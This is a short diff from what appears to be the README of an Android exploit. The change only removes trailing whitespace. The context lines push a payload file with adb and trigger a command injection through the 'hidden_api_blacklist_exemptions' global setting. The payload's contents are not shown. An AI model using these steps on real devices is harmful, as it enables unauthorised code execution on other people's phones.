@@ -27,7 +27,7 @@ adb push payload /data/local/tmp
 
 Then trigger the command injection exploit:
 ```sh
-settings put global hidden_api_blacklist_exemptions "$(cat /data/local/tmp/payload)"                                                                                                               
+settings put global hidden_api_blacklist_exemptions "$(cat /data/local/tmp/payload)"
 ```
 
 
